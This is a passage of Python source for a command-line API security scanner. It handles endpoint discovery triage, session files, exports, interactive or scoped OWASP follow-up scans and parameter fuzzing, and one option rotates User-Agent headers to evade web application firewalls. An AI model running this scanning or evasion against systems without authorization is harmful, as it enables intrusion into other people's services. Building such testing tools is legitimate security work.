    When ``endpoints`` is provided it is aligned positionally with ``records``
    and supplies each view's response ``size`` and ``elapsed`` from the
    ``Endpoint``. The discovered ``Endpoint`` does not retain the response body
    text, so the word/line counts are best-effort ``0`` and the regex predicate
    sees an empty body. When ``endpoints`` is ``None`` (a reloaded session),
    those attributes default to ``0`` because the session file does not persist
    them.
    """
    if endpoints is not None:
        views = [
            DiscoveryResultEx(
                result=record,
                size=getattr(endpoint, "response_size", 0) or 0,
                words=0,   # Endpoint does not retain the response body text
                lines=0,   # Endpoint does not retain the response body text
                elapsed=getattr(endpoint, "response_time", 0.0) or 0.0,
                text="",
            )
            for record, endpoint in zip(records, endpoints)
        ]
    else:
        views = [DiscoveryResultEx(result=record) for record in records]

    # Matchers + filters combine conjunctively (Requirements 22.2-22.4).
    selected = apply_selectors(views, matchers, filters)

    # Soft-404 suppression is applied independently of the matchers/filters and
    # of catch-all suppression: a record removed by either mechanism is excluded
    # (Requirements 22.6, 22.8).
    if soft_404_baseline is not None:
        selected = [
            view for view in selected if not soft_404_baseline.matches(view)
        ]

    return [view.result for view in selected]


def _run_dir_triage(
    *,
    target,
    wordlist_path,
    candidate_set,
    seed_methods,
    output,
    rate_limit,
    methods,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    header,
    cookie,
    basic_auth,
    response,
    status_code,
    matchers,
    filters,
    detect_framework,
    fuzz_versions,
    save_session,
    load_session,
    export_format,
    export_file,
    output_format,
    output_file,
    interactive,
    scan_scope,
    ci_mode,
    proxy,
    proxy_verify_ssl,
    client_cert=None,
    ca_bundle=None,
    allow_cross_domain_redirects=False,
    resolve=None,
    detect_secrets=False,
    secret_patterns=None,
    path_scope=None,
    storage_status=None,
    checkpoint=None,
    resume_checkpoint=None,
    logger,
):
    """Run the discovery triage workflow for the ``dir`` command.

    Sources :class:`DiscoveryResult` records either from a reloaded
    ``Discovery_Session_File`` (``--load-session``; the session file is the sole
    source of truth, Requirements 14.6, 14.7) or from a fresh discovery whose
    ``Endpoint`` objects are projected into records. It then parses the optional
    status filter (Requirement 13.5), renders the triage table grouped by status
    class (Requirements 15.1-15.7), saves the full record set to a session file
    when requested (Requirements 14.1, 14.2), and writes a human-readable export
    grouped by status class when requested (Requirements 14.3-14.5).

    Filter, persistence, and export failures are surfaced as CLI errors.
    """
    from rich.console import Console

    console = Console()

    try:
        # Parse the optional status filter up front so an out-of-range explicit
        # code is reported before any discovery or I/O (Requirements 13.5, 13.6).
        status_filter = parse_status_filter(status_code) if status_code else None

        # Source the Discovery_Result records: reload is the source of truth and
        # skips discovery entirely (Requirements 14.6, 14.7, 15.6, 16.5).
        endpoints = None
        soft_404_baseline = None
        if load_session:
            session = DiscoverySession.load(load_session)
            records = list(session.results)
            logger.info(
                "Loaded discovery session", path=load_session, records=len(records)
            )
        else:
            # Build the discovery configuration exactly as the standard dir path.
            user_agent_config = None
            if user_agent_random:
                user_agent_config = {'random': True}
            elif user_agent_custom:
                user_agent_config = {'custom': user_agent_custom}
            elif user_agent_file:
                user_agents = load_user_agents_from_file(user_agent_file)
                user_agent_config = {'file_list': user_agents}

            output_filename = prepare_output_filename(output)

            advanced_config = {
                'detect_framework': detect_framework,
                'fuzz_versions': fuzz_versions,
                'framework_confidence': 0.6,
            }

            status_code_filter = parse_status_codes(status_code) if status_code else None

            # Parse operator-supplied discovery headers, cookie, and basic-auth
            # so the triage discovery path applies them to every Discovery_Request
            # exactly like the standard dir path (Requirements 24.2, 24.3, 24.4).
            extra_headers = parse_header_options(header)
            if cookie:
                extra_headers['Cookie'] = cookie
            basic_auth_creds = parse_basic_auth(basic_auth)

            config_dict = create_default_config(
                target, wordlist_path, "dir", user_agent_config, output_filename,
                advanced_config, status_code_filter, extra_headers, basic_auth_creds,
            )
            config_dict['proxy'] = proxy
            config_dict['proxy_verify_ssl'] = proxy_verify_ssl
            # Thread transport/TLS options for discovery (Requirement 29) exactly
            # like the standard dir path. The CLI validators have already
            # parsed/validated these before any discovery runs.
            config_dict['client_cert'] = client_cert
            config_dict['ca_bundle'] = ca_bundle
            config_dict['resolve'] = resolve
            config_dict['fuzzing']['endpoints']['allow_cross_domain_redirects'] = allow_cross_domain_redirects

            # Thread the Secret_Detection toggle and optional custom
            # Secret_Patterns into the secret_scan config exactly like the
            # standard dir path (Requirement 30.1/30.6).
            config_dict.setdefault('secret_scan', {})
            config_dict['secret_scan']['enabled'] = detect_secrets
            if secret_patterns is not None:
                config_dict['secret_scan']['patterns'] = secret_patterns

            # Thread the merged in-memory candidate set and per-seed methods into
            # the triage discovery config exactly like the standard dir path
            # (Requirements 25.3, 25.4); None preserves the single-file path.
            if candidate_set is not None:
                config_dict['fuzzing']['endpoints']['candidate_set'] = candidate_set
                config_dict['fuzzing']['endpoints']['seed_methods'] = seed_methods

            if rate_limit:
                config_dict['rate_limiting']['requests_per_second'] = rate_limit
            if methods:
                config_dict['fuzzing']['endpoints']['methods'] = [
                    m.strip() for m in methods.split(',')
                ]
            if jwt:
                config_dict['authentication']['contexts'][0]['token'] = jwt
                config_dict['authentication']['contexts'][0]['type'] = 'bearer'
            if response:
                config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

            # Thread the storage-time Path_Scope and Storage_Status_Selection
            # onto the triage discovery config exactly like the standard dir
            # path so dropped records never enter the session/export/table
            # (Requirements 33.1-33.7). Only the live-discovery branch applies
            # these; the --load-session reload above sources records from the
            # session file and performs no discovery.
            config_dict['fuzzing']['path_scope'] = path_scope
            config_dict['fuzzing']['storage_status'] = storage_status

            config_manager = ConfigurationManager()
            apileak_config = config_manager.load_config_from_dict(config_dict)

            validation_errors = config_manager.validate_configuration()
            if validation_errors:
                logger.error("Configuration validation failed", errors=validation_errors)
                for error in validation_errors:
                    click.echo(f"Error: {error}", err=True)
                sys.exit(1)

            endpoints, soft_404_baseline = asyncio.run(
                _discover_endpoints_for_triage(
                    apileak_config,
                    _build_discovery_progress(
                        ci_mode, apileak_config.fuzzing.max_requests
                    ),
                    checkpoint_path=checkpoint,
                    resume_checkpoint=resume_checkpoint,
                )
            )
            records = [DiscoveryResult.from_endpoint(endpoint) for endpoint in endpoints]
            logger.info("Projected discovery results", records=len(records))

        # Apply response matchers/filters and soft-404 suppression as a pure
        # post-discovery projection so the table, session, export, machine
        # output, and interactive selection all see the already-selected set
        # (Requirement 22). The Status_Code_Filter stays a display-only filter
        # (applied by the table/interactive helpers below), so it never omits
        # records from the persisted session/export (Requirement 14.1). Catch-all
        # suppression (applied during recursion) and soft-404 suppression remain
        # independent mechanisms.
        records = _select_records(
            records,
            endpoints=endpoints,
            matchers=matchers,
            filters=filters,
            soft_404_baseline=soft_404_baseline,
        )

        # Render the triage table from in-memory records, applying the filter to
        # the displayed rows (Requirements 15.1-15.5, 15.7).
        table = render_triage_table(records, status_filter)
        console.print(table)

        # Persist the full record set as the source-of-truth session file. Every
        # record is written, with none omitted (Requirements 14.1, 14.2).
        if save_session:
            session = DiscoverySession(
                target=target,
                timestamp=datetime.now(timezone.utc).isoformat(),
                tool_version=APILEAK_VERSION,
                results=records,
            )
            session.save(save_session)
            click.echo(f"💾 Discovery session saved: {save_session}")

        # Write the human-readable export grouped by status class. The export path
        # extension selects the format and an unsupported format is rejected
        # without writing anything (Requirements 14.3-14.5).
        if export_format or export_file:
            if export_file:
                export_path = export_file
            else:
                output_dir = "reports"
                os.makedirs(output_dir, exist_ok=True)
                export_path = os.path.join(output_dir, f"discovery_export.{export_format}")
            write_discovery_export(records, export_path)
            click.echo(f"📄 Discovery export written: {export_path}")

        # Write the machine-readable discovery output (CSV/JSONL). This is
        # additional to the JSON session file (which remains the reload source of
        # truth) and to the human-readable export. The output path extension
        # selects the format; an unsupported format is rejected without writing
        # anything (Requirements 31.1, 31.4) and a write failure is surfaced as a
        # CLI error (Requirement 31.5).
        if output_format or output_file:
            if output_file:
                # Pass the user-supplied path through as-is and let
                # write_discovery_output validate the extension.
                output_path = output_file
            else:
                output_dir = "reports"
                os.makedirs(output_dir, exist_ok=True)
                output_path = os.path.join(output_dir, f"discovery_output.{output_format}")
            write_discovery_output(records, output_path)
            click.echo(f"📄 Discovery output written: {output_path}")

        # Define the follow-up scan callables used by both the non-interactive
        # --scan-scope path and the interactive triage selection below.
        def _follow_up(selected):
            _run_targeted_follow_up_scan(
                selected,
                rate_limit=rate_limit,
                user_agent_random=user_agent_random,
                user_agent_custom=user_agent_custom,
                user_agent_file=user_agent_file,
                jwt=jwt,
                response=response,
                output=output,
                detect_framework=detect_framework,
                fuzz_versions=fuzz_versions,
                header=header,
                cookie=cookie,
                basic_auth=basic_auth,
                proxy=proxy,
                proxy_verify_ssl=proxy_verify_ssl,
                logger=logger,
            )

        # Batch_Scan_Scope: launch one scoped OWASP scan over N selected records,
        # rebuilding the same rate-limit/User-Agent/header/auth config the
        # originating dir invocation used (Requirements 36.1, 36.3, 36.5). An
        # empty determined scope is reported as "nothing to scan" by the helper
        # (Requirement 36.6).
        def _batch_follow_up(selected_records):
            _run_scoped_owasp_scan(
                selected_records,
                target=target,
                rate_limit=rate_limit,
                user_agent_random=user_agent_random,
                user_agent_custom=user_agent_custom,
                user_agent_file=user_agent_file,
                jwt=jwt,
                response=response,
                output=output,
                detect_framework=detect_framework,
                fuzz_versions=fuzz_versions,
                header=header,
                cookie=cookie,
                basic_auth=basic_auth,
                proxy=proxy,
                proxy_verify_ssl=proxy_verify_ssl,
                logger=logger,
            )

        # A non-interactive --scan-scope determines the Batch_Scan_Scope from all
        # matching records and drives the scoped OWASP scan directly, with no
        # interactive prompt. In CI_Mode this is the ONLY way the scope is
        # determined and it never blocks (Requirements 36.2, 36.4). The token was
        # already validated up front, so selection cannot raise here.
        if scan_scope is not None:
            scoped_records = select_scope_records(records, scan_scope)
            _batch_follow_up(scoped_records)
            return

        # Interactive triage selection (opt-in). The helper enforces the full
        # contract: it is disabled by default, never prompts in CI mode, skips an
        # empty (filtered) table, bounds invalid selections to 3 consecutive
        # attempts, launches exactly one Targeted_Follow_Up_Scan on a single
        # valid selection, and launches one Batch_Scan_Scope OWASP scan on a
        # multi-index selection (Requirements 16.1-16.4, 16.6-16.8, 36.1).
        run_interactive_triage(
            records,
            ci_mode,
            interactive,
            status_filter=status_filter,
            follow_up=_follow_up,
            batch_follow_up=_batch_follow_up,
        )

    except ValueError as exc:
        # Invalid status filter (e.g. an out-of-range explicit code) — Req 13.6.
        logger.error("Discovery triage filter error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoverySessionError as exc:
        # Session persistence/reload failures — Requirements 14.2, 14.9, 14.10.
        logger.error("Discovery session error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryCheckpointError as exc:
        # Checkpoint write failure during a checkpointed (and possibly resumed)
        # triage discovery run — Requirement 37.6. The atomic save leaves no
        # partial file behind; surface the descriptive message as a CLI error.
        logger.error("Discovery checkpoint error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryExportError as exc:
        # Unsupported/failed human-readable export — Requirement 14.4.
        logger.error("Discovery export error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except DiscoveryOutputError as exc:
        # Unsupported machine-readable output format or write failure —
        # Requirements 31.4, 31.5. UnsupportedOutputFormatError is a subclass of
        # DiscoveryOutputError, so both are surfaced here as a CLI error.
        logger.error("Discovery output error", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)
    except Exception as exc:  # noqa: BLE001 - surface any other failure as a CLI error
        logger.error("Directory triage failed", error=str(exc))
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)


class ScanScopeError(ValueError):
    """Raised when a ``--scan-scope`` value is not a recognized Status_Code_Class
    or EndpointStatus (Requirement 36.7).

    Subclasses :class:`ValueError` so the existing ``dir`` triage error handling
    surfaces it as a descriptive CLI error performing no scan.
    """


# Recognized non-interactive Batch_Scan_Scope selectors (Requirement 36.2): the
# four Status_Code_Class tokens and the two selectable EndpointStatus values.
SCAN_SCOPE_STATUS_CLASSES = ("2xx", "3xx", "4xx", "5xx")
SCAN_SCOPE_ENDPOINT_STATUSES = ("valid", "auth_required")


def select_scope_records(records, scan_scope):
    """Return every :class:`DiscoveryResult` matching the Batch_Scan_Scope token.

    The ``scan_scope`` token is one of the four Status_Code_Class values
    (``2xx``/``3xx``/``4xx``/``5xx``) or one of the selectable EndpointStatus
    values (``valid``/``auth_required``), selecting all matching records as the
    scope for an OWASP scan (Requirement 36.2). An unrecognized token raises a
    descriptive :class:`ScanScopeError` naming the value and selects nothing
    (Requirement 36.7).

    Args:
        records: The in-memory ``DiscoveryResult`` records to filter.
        scan_scope: The raw ``--scan-scope`` token.

    Returns:
        The list of records that match the scope (possibly empty).

    Raises:
        ScanScopeError: If ``scan_scope`` is not a recognized token.
    """
    token = (scan_scope or "").strip().lower()
    if token in SCAN_SCOPE_STATUS_CLASSES:
        return [r for r in records if status_code_class(r.status_code) == token]
    if token in SCAN_SCOPE_ENDPOINT_STATUSES:
        return [r for r in records if r.endpoint_status == token]
    raise ScanScopeError(
        f"Unrecognized --scan-scope value '{scan_scope}': expected one of "
        f"2xx, 3xx, 4xx, 5xx, valid, auth_required."
    )


def _parse_selection_indices(selection, count):
    """Parse a multi-index/range triage selection into sorted 1-based indices.

    Accepts comma-separated indices and inclusive ranges, e.g. ``"1,3,5"`` or
    ``"2-4"`` (and combinations like ``"1,3-5"``). Every index must fall within
    ``[1, count]``. Returns a sorted list of unique indices, or ``None`` when the
    selection is empty or contains any malformed/out-of-range token (so the
    caller treats it as an invalid selection and re-prompts).
    """
    selection = (selection or "").strip()
    if not selection:
        return None

    indices = set()
    for token in selection.split(","):
        token = token.strip()
        if not token:
            return None
        if "-" in token:
            parts = token.split("-")
            if len(parts) != 2:
                return None
            start_raw, end_raw = parts[0].strip(), parts[1].strip()
            if not (start_raw.isdigit() and end_raw.isdigit()):
                return None
            start, end = int(start_raw), int(end_raw)
            if start > end:
                return None
            for index in range(start, end + 1):
                if not 1 <= index <= count:
                    return None
                indices.add(index)
        else:
            if not token.isdigit():
                return None
            index = int(token)
            if not 1 <= index <= count:
                return None
            indices.add(index)

    if not indices:
        return None
    return sorted(indices)


def run_interactive_triage(
    records,
    ci_mode,
    interactive_flag,
    *,
    status_filter=None,
    follow_up=None,
    batch_follow_up=None,
    prompt_func=None,
    echo=None,
    max_invalid_attempts=3,
):
    """Run the opt-in interactive triage selection prompt (Requirement 16).

    Interactive triage is **disabled by default** and is engaged only when the
    caller explicitly opts in via ``interactive_flag`` (Requirement 16.4). It is
    **automatically disabled while CI_Mode is active** so no prompt is ever shown
    and execution continues without blocking a pipeline (Requirement 16.3). When
    the (filtered) record set is empty the prompt is skipped and no follow-up
    scan is initiated (Requirement 16.8).

    Otherwise the function presents the filtered records (in the same ascending
    status-class order as the triage table) and prompts for a selection
    (Requirement 16.1). The selection may name a single index, or multiple
    indices/ranges (e.g. ``1,3,5`` or ``2-4``). A single-index selection invokes
    ``follow_up`` exactly once with the chosen :class:`DiscoveryResult`,
    launching a single ``Targeted_Follow_Up_Scan`` scoped to that endpoint
    (Requirement 16.2). A selection of two or more records instead invokes
    ``batch_follow_up`` once with the selected records, defining a
    ``Batch_Scan_Scope`` (Requirement 36.1). An invalid selection re-prompts
    without starting a scan, up to a maximum of 3 consecutive invalid attempts;
    after the 3rd the function exits interactive mode without a scan and prints a
    "selection abandoned" message (Requirements 16.6, 16.7).

    Args:
        records: The in-memory discovery records (already the reload source of
            truth when ``--load-session`` was used, Requirement 16.5).
        ci_mode: Whether CI_Mode is active; ``True`` disables the prompt.
        interactive_flag: The explicit opt-in flag; ``False`` disables the prompt.
        status_filter: The parsed status filter so the selectable set matches the
            displayed (filtered) table.
        follow_up: Callable invoked with the selected record to launch the
            single-endpoint targeted follow-up scan. Optional so the selection
            logic stays testable in isolation.
        batch_follow_up: Callable invoked with the list of selected records when
            two or more are chosen, launching a Batch_Scan_Scope OWASP scan
            (Requirement 36.1). Optional.
        prompt_func: Callable taking a prompt message and returning the raw user
            input; defaults to a ``click.prompt`` wrapper. Injectable for tests.
        echo: Callable used for output; defaults to :func:`click.echo`.
        max_invalid_attempts: Maximum consecutive invalid selections before the
            prompt is abandoned (defaults to 3, Requirement 16.6).

    Returns:
        The selected :class:`DiscoveryResult` for a single-index selection, the
        list of selected records for a multi-index selection, otherwise ``None``
        (disabled, CI mode, empty table, or abandoned).
    """
    log = get_logger("dir")
    echo = echo or click.echo

    # Opt-in: disabled by default (Requirement 16.4).
    if not interactive_flag:
        return None

    # Automatically disabled in CI mode — no prompt, never blocks (Req 16.3).
    if ci_mode:
        log.info("Interactive triage disabled in CI mode")
        return None

    # Build the displayed record list in the same filtered, ascending
    # status-class order used by the triage table so selection indices line up
    # with what the user sees (Requirements 16.1, 15.4, 15.5).
    filtered = apply_status_filter(records, status_filter)
    grouped = group_by_status_class(filtered)
    displayed = [record for class_records in grouped.values() for record in class_records]

    # Empty (filtered) table: skip the prompt, initiate no scan (Req 16.8).
    if not displayed:
        log.info("Interactive triage skipped: no records to display")
        return None

    if prompt_func is None:
        def prompt_func(message):
            return click.prompt(message, default="", show_default=False)

    echo("\nSelect endpoint(s) for a follow-up scan:")
    echo("  Enter a single index for a targeted scan, or multiple "
         "indices/ranges (e.g. 1,3,5 or 2-4) for a batch OWASP scan.")
    for index, record in enumerate(displayed, start=1):
        echo(f"  {index}. [{record.status_code}] {record.method} {record.url}")

    invalid_attempts = 0
    while invalid_attempts < max_invalid_attempts:
        try:
            raw = prompt_func(f"Enter selection (1-{len(displayed)})")
        except (EOFError, click.Abort):
            raw = ""

        selection = (raw or "").strip()
        chosen_indices = _parse_selection_indices(selection, len(displayed))

        if chosen_indices is None:
            # Invalid selection: re-prompt without launching a scan (Req 16.6).
            invalid_attempts += 1
            remaining = max_invalid_attempts - invalid_attempts
            if remaining > 0:
                echo(
                    f"Invalid selection. Please try again "
                    f"({remaining} attempt(s) remaining).",
                    err=True,
                )
            continue

        selected_records = [displayed[index - 1] for index in chosen_indices]

        if len(selected_records) >= 2:
            # Two or more records: define a Batch_Scan_Scope (Req 36.1) and launch
            # a single scoped OWASP scan over the selected set.
            log.info(
                "Interactive triage batch selection",
                endpoints=len(selected_records),
            )
            if batch_follow_up is not None:
                batch_follow_up(selected_records)
            return selected_records

        # Single record: launch exactly one Targeted_Follow_Up_Scan (Req 16.2).
        selected = selected_records[0]
        log.info(
            "Interactive triage selection",
            url=selected.url,
            method=selected.method,
        )
        if follow_up is not None:
            follow_up(selected)
        return selected

    # 3 consecutive invalid selections: abandon without a scan (Req 16.6, 16.7).
    echo(
        "Selection abandoned after 3 invalid attempts. "
        "No follow-up scan was started.",
        err=True,
    )
    log.info("Interactive triage abandoned after invalid selections")
    return None


def _run_targeted_follow_up_scan(
    selected,
    *,
    rate_limit,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    response,
    output,
    detect_framework,
    fuzz_versions,
    header=(),
    cookie=None,
    basic_auth=None,
    proxy=None,
    proxy_verify_ssl=False,
    logger,
):
    """Launch one ``Targeted_Follow_Up_Scan`` scoped to ``selected`` (Req 16.2).

    Reuses the existing discovery/scan path (:func:`run_enhanced_apileak`) but
    scopes it to the single selected endpoint by using the record's URL as the
    scan target and restricting the tested methods to the selected method.

    Args:
        selected: The :class:`DiscoveryResult` chosen by the user.
        rate_limit, user_agent_*, jwt, response, output, detect_framework,
        fuzz_versions: The same discovery options passed to the ``dir`` command,
            so the follow-up honors the user's original settings.
        header, cookie, basic_auth: The same Discovery_Header_Option values
            supplied to the originating ``dir`` invocation, re-applied to the
            scoped config so the follow-up scan sends them on every request
            (Requirement 24.7).
        logger: The command logger.
    """
    logger.info(
        "Targeted follow-up scan starting",
        url=selected.url,
        method=selected.method,
    )
    click.echo(
        f"🎯 Starting targeted follow-up scan: {selected.method} {selected.url}"
    )

    user_agent_config = None
    if user_agent_random:
        user_agent_config = {'random': True}
    elif user_agent_custom:
        user_agent_config = {'custom': user_agent_custom}
    elif user_agent_file:
        user_agents = load_user_agents_from_file(user_agent_file)
        user_agent_config = {'file_list': user_agents}

    output_filename = prepare_output_filename(output)

    advanced_config = {
        'detect_framework': detect_framework,
        'fuzz_versions': fuzz_versions,
        'framework_confidence': 0.6,
    }

    # Re-apply the operator-supplied discovery headers, cookie, and basic-auth so
    # the Targeted_Follow_Up_Scan inherits the same Discovery_Header_Option values
    # as the originating dir invocation (Requirement 24.7). The cookie rides the
    # same custom_headers path as --header.
    extra_headers = parse_header_options(header)
    if cookie:
        extra_headers['Cookie'] = cookie
    basic_auth_creds = parse_basic_auth(basic_auth)

    # Scope the scan to the single selected endpoint URL (no wordlist expansion).
    config_dict = create_default_config(
        selected.url, None, "dir", user_agent_config, output_filename,
        advanced_config, None, extra_headers, basic_auth_creds,
    )
    config_dict['proxy'] = proxy
    config_dict['proxy_verify_ssl'] = proxy_verify_ssl

    if rate_limit:
        config_dict['rate_limiting']['requests_per_second'] = rate_limit
    # Restrict to the selected endpoint's method so the follow-up stays scoped.
    config_dict['fuzzing']['endpoints']['methods'] = [selected.method]
    if jwt:
        config_dict['authentication']['contexts'][0]['token'] = jwt
        config_dict['authentication']['contexts'][0]['type'] = 'bearer'
    if response:
        config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

    config_manager = ConfigurationManager()
    apileak_config = config_manager.load_config_from_dict(config_dict)

    validation_errors = config_manager.validate_configuration()
    if validation_errors:
        logger.error(
            "Targeted follow-up scan configuration invalid",
            errors=validation_errors,
        )
        for error in validation_errors:
            click.echo(f"Error: {error}", err=True)
        return

    asyncio.run(run_enhanced_apileak(apileak_config))


def _run_scoped_owasp_scan(
    selected_records,
    *,
    target,
    rate_limit,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    response,
    output,
    detect_framework=False,
    fuzz_versions=False,
    header=(),
    cookie=None,
    basic_auth=None,
    proxy=None,
    proxy_verify_ssl=False,
    logger,
):
    """Launch one OWASP scan scoped to ``selected_records`` (Batch_Scan_Scope, Req 36).

    Generalizes :func:`_run_targeted_follow_up_scan` from a single endpoint to N
    selected :class:`DiscoveryResult` records. The selected set is threaded into
    ``run_enhanced_apileak(..., scope_endpoints=...)`` which seeds
    ``APILeakCore.run_scan(scope_endpoints=...)``, so the OWASP modules consume
    exactly the seeded endpoints and wordlist discovery is skipped
    (Requirements 36.3, 36.8). The scan runs through the Full_Command engine scan
    path so the OWASP_Modules execute against the seeded set.

    The same Rate_Limit, User_Agent_Option, Discovery_Header_Option, and auth
    values supplied to the originating ``dir`` invocation are rebuilt onto the
    scoped config so every request the scan issues inherits them
    (Requirement 36.5).

    An empty determined scope performs no scan and reports that there is nothing
    to scan (Requirement 36.6).

    Args:
        selected_records: The selected :class:`DiscoveryResult` records forming
            the Batch_Scan_Scope.
        target: The originating ``dir`` target URL, used as the scan's base URL.
        rate_limit, user_agent_*, jwt, response, output, detect_framework,
        fuzz_versions: The same discovery options supplied to the ``dir`` command,
            re-applied so the scoped scan honors the operator's settings.
        header, cookie, basic_auth: The same Discovery_Header_Option values
            supplied to the originating ``dir`` invocation, re-applied so the
            scoped scan sends them on every request (Requirement 36.5).
        proxy, proxy_verify_ssl: Proxy settings carried through unchanged.
        logger: The command logger.
    """
    # Empty determined scope: perform no scan, report nothing to scan (Req 36.6).
    if not selected_records:
        logger.info("Scoped OWASP scan skipped: empty scope")
        click.echo("Nothing to scan: the selected scope contains no endpoints.")
        return

    logger.info(
        "Scoped OWASP scan starting",
        endpoints=len(selected_records),
    )
    click.echo(
        f"🎯 Starting scoped OWASP scan over {len(selected_records)} endpoint(s)"
    )

    user_agent_config = None
    if user_agent_random:
        user_agent_config = {'random': True}
    elif user_agent_custom:
        user_agent_config = {'custom': user_agent_custom}
    elif user_agent_file:
        user_agents = load_user_agents_from_file(user_agent_file)
        user_agent_config = {'file_list': user_agents}

    output_filename = prepare_output_filename(output)

    advanced_config = {
        'detect_framework': detect_framework,
        'fuzz_versions': fuzz_versions,
        'framework_confidence': 0.6,
    }

    # Re-apply the operator-supplied discovery headers, cookie, and basic-auth so
    # the scoped scan inherits the same Discovery_Header_Option values as the
    # originating dir invocation (Requirement 36.5). The cookie rides the same
    # custom_headers path as --header.
    extra_headers = parse_header_options(header)
    if cookie:
        extra_headers['Cookie'] = cookie
    basic_auth_creds = parse_basic_auth(basic_auth)

    # Build a "full" engine config so the OWASP_Modules run against the seeded
    # endpoints (Requirement 36.3). scope_endpoints seeds the discovery phase
    # directly, so no wordlist is needed.
    config_dict = create_enhanced_config(
        target, None, "full", user_agent_config, output_filename,
        advanced_config, None, False, "critical", False,
        extra_headers, basic_auth_creds,
    )
    config_dict['proxy'] = proxy
    config_dict['proxy_verify_ssl'] = proxy_verify_ssl

    # Rebuild the same rate-limit override the originating dir used (Req 36.5).
    if rate_limit:
        config_dict['rate_limiting']['requests_per_second'] = rate_limit
    if jwt:
        config_dict['authentication']['contexts'][0]['token'] = jwt
        config_dict['authentication']['contexts'][0]['type'] = 'bearer'
    if response:
        config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

    config_manager = ConfigurationManager()
    apileak_config = config_manager.load_config_from_dict(config_dict)

    validation_errors = config_manager.validate_configuration()
    if validation_errors:
        logger.error(
            "Scoped OWASP scan configuration invalid",
            errors=validation_errors,
        )
        for error in validation_errors:
            click.echo(f"Error: {error}", err=True)
        return

    # Thread the selected set into the engine scan path so the OWASP modules
    # consume exactly the seeded endpoints (Requirements 36.3, 36.8).
    asyncio.run(
        run_enhanced_apileak(apileak_config, scope_endpoints=selected_records)
    )


@cli.command()
@click.option('--target', '-t', required=True, help='Target URL to scan')
@click.option('--wordlist', '-w', help='Wordlist file for parameter fuzzing')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST', 
              help='HTTP methods to test (comma-separated)')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during parameter fuzzing')
@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets.')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
@click.pass_context
def par(ctx, target, wordlist, output, log_level, log_file, json_logs, rate_limit, methods, user_agent_random, user_agent_custom, user_agent_file, jwt, response, status_code, detect_framework, proxy, proxy_verify_ssl):
    """Parameter fuzzing - discover hidden parameters in API endpoints
    
    \b
    Examples:
      python apileaks.py par --target https://api.example.com/users/123
      python apileaks.py par --target URL --jwt TOKEN --wordlist params.txt
      python apileaks.py par --target URL --user-agent-random --rate-limit 3
    """
    
    # Validate user agent options
    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    
    # Setup logging
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    logger = get_logger("par")
    
    logger.info("APILeak parameter fuzzing starting", version="0.1.0", target=target)
    
    try:
        # Prepare user agent configuration
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {'random': True}
        elif user_agent_custom:
            user_agent_config = {'custom': user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {'file_list': user_agents}
        
        # Prepare output filename
        output_filename = prepare_output_filename(output)
        
        # Prepare advanced configuration for parameter fuzzing
        advanced_config = {
            'detect_framework': detect_framework,
            'fuzz_versions': False,  # Version fuzzing not typically useful for parameter mode
            'framework_confidence': 0.6  # Default confidence for par mode
        }
        
        # Parse status code filter for HTTP output
        status_code_filter = parse_status_codes(status_code) if status_code else None
        
        # Create default configuration for parameter fuzzing
        config_dict = create_default_config(target, wordlist, "par", user_agent_config, output_filename, advanced_config, status_code_filter)
        config_dict['proxy'] = proxy
        config_dict['proxy_verify_ssl'] = proxy_verify_ssl
        
        # Apply CLI overrides
        if rate_limit:
            config_dict['rate_limiting']['requests_per_second'] = rate_limit
        if jwt:
            config_dict['authentication']['contexts'][0]['token'] = jwt
            config_dict['authentication']['contexts'][0]['type'] = 'bearer'
        if response:
            config_dict['fuzzing']['response_filter'] = parse_response_codes(response)
        # Note: methods parameter is not used for parameter fuzzing as it's handled differently
        
        # Load configuration through ConfigurationManager
        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)
        
        # Validate configuration
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            logger.error("Configuration validation failed", errors=validation_errors)
            for error in validation_errors:
                click.echo(f"Error: {error}", err=True)
            sys.exit(1)
        
        # Run the scan
        asyncio.run(run_enhanced_apileak(apileak_config))
        
    except Exception as e:
        logger.error("Parameter fuzzing failed", error=str(e))
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.option('--config', '-c', type=click.Path(exists=True), 
              help='Configuration file path (YAML or JSON) - optional')
@click.option('--target', '-t', help='Target URL to scan (overrides config)')
